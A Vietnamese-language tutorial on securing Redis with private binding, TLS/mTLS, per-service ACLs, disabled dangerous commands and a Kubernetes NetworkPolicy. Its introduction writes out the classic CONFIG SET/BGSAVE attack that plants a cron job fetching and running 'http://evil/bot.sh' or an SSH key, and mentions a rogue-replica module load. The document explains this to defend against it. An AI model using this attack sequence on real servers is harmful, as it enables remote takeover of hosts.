# Bảo mật Redis Zero-Trust: Mạng Nội bộ, TLS/mTLS & Phân quyền ACL

Trong lịch sử an ninh đám mây thập kỷ qua, **cổng `6379` bị phơi trần ra Internet với cấu hình `bind 0.0.0.0` không mật khẩu** luôn nằm trong Top 3 con đường nhanh nhất để botnet đào tiền ảo (*Cryptojacking*) và mã độc tống tiền (*Ransomware*) chiếm trọn quyền `root` của máy chủ Linux chỉ trong **chưa đầy 90 giây** kể từ lúc mở cổng!

Vì sao một cơ sở dữ liệu lưu trên RAM lại có thể giúp kẻ tấn công chiếm quyền điều khiển hệ điều hành (`Remote Code Execution - RCE`)?
- [!] **Kịch bản khai thác kinh điển kéo dài 4 dòng lệnh:** Nếu kẻ tấn công kết nối được vào một tiến trình Redis chạy dưới quyền `root` (hoặc user có quyền ghi thư mục hệ thống), chúng chỉ cần gõ:
  1. `CONFIG SET dir /var/spool/cron` (hoặc `/root/.ssh`)
  2. `CONFIG SET dbfilename root` (hoặc `authorized_keys`)
  3. `SET payload "\n\n*/1 * * * * curl -fsSL http://evil/bot.sh | sh\n\n"`
  4. `BGSAVE` → Redis ngoan ngoãn xuất khoá trên thành tệp lịch trình `cron` của hệ điều hành hoặc chèn SSH Public Key của tin tặc vào máy chủ! (Hoặc tinh vi hơn: ép Redis làm Replica cho một máy chủ giả mạo qua `REPLICAOF attacker-ip 6379` để nạp Module C độc hại!).

Để biến cụm Redis thành một pháo đài bất khả xâm phạm đạt chuẩn kiểm toán PCI-DSS / SOC2, kỹ sư SRE triển khai mô hình **Phòng thủ chiều sâu 4 lớp (*Defense-in-Depth Zero-Trust*)**:

> [!ANALOGY] Ẩn dụ Hầm Ngân Hàng Trung Ương 4 Lớp Khoá
> - **Lớp 1 — Tường rào Mạng (`VPC + NetworkPolicy + bind`):** Hầm vàng đặt sâu dưới lòng đất, chỉ xe bọc thép mang biển số nội bộ của quầy giao dịch (`app: api-backend`) mới được đi vào đường hầm; người đi đường ngoài phố thậm chí không thấy cánh cửa tồn tại!
> - **Lớp 2 — Đường ống Chống Nghe lén (`port 0 + mTLS`):** Mọi cuộc gọi bộ đàm giữa xe bọc thép và hầm vàng đều mã hoá hai chiều bằng chứng chỉ số; ai không có thẻ từ hợp lệ bị ngắt kết nối ngay từ vòng bắt tay TCP!
> - **Lớp 3 — Thẻ Định danh Phân quyền Hạt mịn (`Redis ACL`):** Nhân viên quầy Thanh toán (`checkout-svc`) chỉ mở được đúng dãy tủ `~checkout:*`, nhân viên Kiểm toán (`analytics-ro`) chỉ được nhìn (`+@read`) dãy tủ `~metrics:*`, và chìa khoá vạn năng không mật khẩu (`user default`) bị bẻ gãy vĩnh viễn (`off`)!
> - **Lớp 4 — Tháo Kíp Nổ (`-@dangerous` & `rename-command`):** Toàn bộ nút bấm tự huỷ toà nhà (`FLUSHALL`, `FLUSHDB`, `DEBUG`, `CONFIG`) bị tháo bỏ khỏi bảng điều khiển của mọi dịch vụ ứng dụng!

## 1. Bức tranh Tổng thể Kiến trúc Bảo mật Redis Zero-Trust

```visual
kind: illustration
diagram: "redis:r16"
alt: "Kiến trúc bảo mật Redis Zero-Trust 4 lớp: NetworkPolicy, mTLS, ACL theo microservice và vô hiệu hoá lệnh nguy hiểm"
badge: "Zero-Trust Security · R16"
title: "Pháo đài Redis Zero-Trust: Mạng Riêng, Mã hoá mTLS & Phân quyền ACL Hạt mịn"
subtitle: "Chặn đứng truy cập trái phép từ tầng L3/L4 Kubernetes NetworkPolicy cho tới kiểm soát từng tiền tố khoá và từng nhóm lệnh trên Redis 8"
caption: "Không bao giờ tin tưởng mạng nội bộ một cách mù quáng: kết hợp NetworkPolicy + mTLS + ACL tách biệt cho từng Microservice."
callouts:
  - num: 1
    label: "Cô lập Mạng & Khoá Plaintext (port 0)"
    desc: "Chỉ lắng nghe trên IP nội bộ (bind), bật protected-mode yes, chặn L4 bằng K8s NetworkPolicy và tắt cổng không mã hoá (port 0 + tls-port 6379)."
    tone: cyan
  - num: 2
    label: "Tắt user default & Cấp quyền ACL tối thiểu"
    desc: "Vô hiệu hoá user default off; mỗi dịch vụ có tài khoản riêng giới hạn đúng nhánh khoá (~checkout:*) và quyền đọc/ghi (%R~ / %W~)."
    tone: emerald
  - num: 3
    label: "Chặn Nhóm Lệnh Huỷ Diệt (-@dangerous)"
    desc: "Cấm tuyệt đối ứng dụng gọi KEYS, FLUSHALL, FLUSHDB, CONFIG, REPLICAOF, DEBUG qua ACL -@dangerous hoặc rename-command thành chuỗi rỗng."
    tone: rose
```

## 2. Lớp 1 & Lớp 2: Khoá Cứng Tầng Mạng, `protected-mode` và Mã hoá mTLS

Trước Redis 6, nhiều đội vận hành dựa hoàn toàn vào `requirepass` trên kết nối văn bản thuần (*plaintext*). Cách làm này mang **2 lỗ hổng chí mạng**:
1. Mật khẩu truyền dạng rõ qua cáp mạng VPC (dễ bị lộ nếu bắt gói tin hoặc rò rỉ proxy).
2. Toàn bộ 50 microservices dùng chung **duy nhất một mật khẩu `requirepass`** — chỉ cần 1 dịch vụ phụ bị lộ biến môi trường hoặc xoay vòng mật khẩu là cả 50 dịch vụ phải khởi động lại cùng lúc!

Cấu hình chuẩn Production (`redis-tls-mtls-prod.conf`) giải quyết triệt để từ gốc mạng:

```ini
# 1. Chỉ lắng nghe trên loopback và đúng IP card mạng Private VPC (TUYỆT ĐỐI KHÔNG dùng 0.0.0.0!)
bind 127.0.0.1 10.0.1.15
protected-mode yes

# 2. Tắt hoàn toàn cổng văn bản thuần (port 0) và chỉ mở cổng TLS 6379
port 0
tls-port 6379

# 3. Cấu hình chứng chỉ số & bắt buộc xác thực mTLS 2 chiều với Client
tls-cert-file /etc/redis/certs/redis-server.crt
tls-key-file /etc/redis/certs/redis-server.key
tls-ca-cert-file /etc/redis/certs/ca.crt
tls-auth-clients yes
tls-protocols "TLSv1.3"

# 4. Đẩy gánh nặng giải mã TLS sang 4 luồng I/O phụ để không làm chậm Event Loop chính!
io-threads 4
io-threads-do-reads yes

# 5. Nạp danh sách tài khoản phân quyền từ tệp ACL chuyên biệt
aclfile /etc/redis/users.acl
```

> [!TIP] Hiệu năng TLS trên Redis 8 có làm tăng độ trễ không?
> Bắt tay và mã hoá TLS tốn CPU hơn TCP thuần, nhưng khi bạn bật `io-threads 4` và `io-threads-do-reads yes` trên máy đa nhân (kèm Connection Pooling giữ kết nối bền vững từ phía ứng dụng), toàn bộ khâu đọc/ghi mã hoá OpenSSL được san sẻ sang các luồng I/O phụ — luồng chính xử lý dữ liệu hầu như không suy giảm thông lượng!

## 3. Lớp 3 & Lớp 4: Phân Quyền Hạt Mịn với Redis ACL (*Access Control List*)

Hệ thống **Redis ACL** cho phép định nghĩa chính xác **Ai (`username` + mật khẩu băm SHA-256)** được chạm vào **Nhánh khoá nào (`~pattern` / `%R~` / `%W~`)**, trên **Kênh Pub/Sub nào (`&channel`)**, bằng **Nhóm lệnh nào (`+@category` / `-@category`)**:

```visual
kind: anatomy
title: "Giải Phẫu Cú Pháp Phân Quyền Một Dòng Lệnh Redis ACL"
subtitle: "Đọc từ trái sang phải: quy tắc viết sau sẽ ghi đè (override) quy tắc viết trước!"
items:
  - keyword: "on >StrongPass2026"
    role: "Identity & SHA-256 Auth"
    summary: "`on` kích hoạt tài khoản (`off` để khoá khẩn cấp mà không xoá user); tiền tố `>` tự động băm mật khẩu sang mã `#sha256` trong bộ nhớ (tuyệt đối không bao giờ dùng `nopass`!)."
    example: "user checkout-svc on >StrongPass2026"
    lang: redis-conf
    tone: cyan
  - keyword: "~checkout:* %R~catalog:*"
    role: "Keyspace & Pub/Sub Scope"
    summary: "`~checkout:*` cho phép cả đọc lẫn ghi trên nhánh thanh toán; `%R~catalog:*` (Redis 7+) chỉ cho phép ĐỌC danh mục sản phẩm mà cấm sửa đổi; `&events:checkout:*` giới hạn kênh Pub/Sub."
    example: "resetkeys ~checkout:* %R~catalog:* &events:checkout:*"
    lang: redis-conf
    tone: emerald
  - keyword: "-@all +@read +@write -@dangerous"
    role: "Command Category Guard"
    summary: "Chiến lược an toàn nhất là từ chối tất cả trước (`-@all`), chỉ cấp nhóm cần thiết (`+@read`, `+@write`) và luôn chặn tường minh `-@dangerous` (`KEYS`, `FLUSHALL`, `FLUSHDB`, `CONFIG`, `SHUTDOWN`, `DEBUG`)."
    example: "-@all +@read +@write +@scripting -@dangerous"
    lang: redis-conf
    tone: amber
```

Hãy xem tệp `/etc/redis/users.acl` chuẩn mực cho 3 vai trò thực tế trong một doanh nghiệp thương mại điện tử:

```ini
# 1. Khoá chặt tài khoản mặc định: mọi kết nối chưa chạy AUTH <user> <pass> đều bị chặn ngay!
user default off resetkeys -@all

# 2. Microservice Thanh toán: đọc/ghi nhánh checkout:*, chạy Lua nhưng CẤM toàn bộ lệnh nguy hiểm
user checkout-svc on >CheckoutStrong2026 ~checkout:* +@all -@dangerous -@admin

# 3. Dịch vụ Báo cáo / BI: CHỈ ĐƯỢC ĐỌC trên nhánh metrics:*, không thể sửa/xoá bất kỳ khoá nào
user analytics-ro on >AnalyticsRead2026 ~metrics:* -@all +@read -keys

# 4. SRE / Exporter giám sát: chỉ được đọc thông số sức khoẻ hệ thống, không được đọc dữ liệu khách hàng!
user exporter-mon on >ExporterMon2026 resetkeys -@all +info +ping +slowlog +latency +memory +client
```

> [!TRAP] Cạm bẫy Thứ tự Quy tắc trong Redis ACL!
> Redis đánh giá các quy tắc lệnh **tuần tự từ trái sang phải**!
> - ĐÚNG: `+@all -@dangerous` → Cấp toàn bộ lệnh rồi **gỡ bỏ nhóm nguy hiểm** (an toàn!).
> - SAI CHẾT NGƯỜI: `-@dangerous +@all` → Chặn nhóm nguy hiểm trước nhưng ngay sau đó **`+@all` bật lại tất cả 100% lệnh bao gồm cả `FLUSHALL` và `KEYS *`**! Luôn đặt các quy tắc cấm (`-@dangerous`, `-keys`, `-flushall`) ở **cuối dòng**!

## 4. Cô Lập Tầng Mạng Kubernetes với `NetworkPolicy`

Trên môi trường Kubernetes, mặc định mọi Pod trong mọi Namespace đều có thể mở kết nối TCP tới cổng `6379` của Pod Redis! Nếu một Pod xử lý ảnh bên ngoài bị dính lỗ hổng SSRF/RCE, tin tặc sẽ bàn đạp từ Pod đó quét thẳng sang Redis. Do đó, luôn triển khai `NetworkPolicy` theo nguyên tắc **Default Deny + Whitelist**:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: redis-zero-trust
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: redis
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: api-backend
      ports:
        - protocol: TCP
          port: 6379
```

Khi áp dụng manifest trên, nhân mạng Linux (`eBPF` / `Cilium` / `Calico`) sẽ tự động đánh rơi (`DROP`) mọi gói tin SYN nhắm vào cổng `6379` của Pod `app: redis` trừ phi nguồn phát xuất phát từ đúng các Pod mang nhãn `app: api-backend`!

> [!REMEMBER] Ghi nhớ cốt lõi từ R16
> 1. **Tuyệt đối không bao giờ phơi cổng Redis ra Internet (`bind 0.0.0.0` không bảo vệ)**: luôn chỉ định `bind 127.0.0.1 <private-ip>`, giữ `protected-mode yes` và khóa tầng L4 bằng Security Group / Kubernetes `NetworkPolicy`.
> 2. Để bật mã hoá hoàn toàn, phải đặt **`port 0`** (tắt cổng thường) kết hợp **`tls-port 6379`** và `tls-auth-clients yes`.
> 3. Trên Redis 6/7/8+, hãy **tắt tài khoản mặc định (`user default off`)** và tạo tài khoản **ACL riêng cho từng microservice** giới hạn tiền tố khoá (`~service:*`) kèm **`-@dangerous`** ở cuối câu lệnh.
> 4. Bảo hiểm kép cho dữ liệu Production bằng cách vô hiệu hoá các lệnh xoá trắng như `FLUSHALL` và `FLUSHDB` qua ACL hoặc `rename-command FLUSHALL ""`.
